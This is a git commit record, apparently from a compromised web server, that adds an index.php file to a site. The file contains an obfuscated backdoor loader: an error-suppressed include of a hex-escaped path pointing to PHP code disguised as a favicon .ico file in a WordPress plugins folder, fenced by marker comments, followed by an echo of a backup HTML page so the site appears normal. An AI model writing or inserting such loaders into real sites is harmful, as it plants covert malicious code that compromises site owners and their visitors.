8d8cf7133cf292b0108df1c9879b27ae8d5bb929
root <root@vps22165.inmotionhosting.com>
2017-09-21 16:45:42 -0400

    init everest

---
+++ index.php
@@ -0,0 +1,13 @@
+<?php
+
+
+
+
+/*4920d*/
+
+@include "\x2fhome\x2fkeyp\x61n6/p\x75blic\x5fhtml\x2fpagi\x6easwe\x62ks.c\x6fm/wp\x2dcont\x65nt/l\x61ngua\x67es/p\x6cugin\x73/fav\x69con_\x65402d\x30.ico";
+
+/*4920d*/
+
+
+echo file_get_contents('index.html.bak.bak');
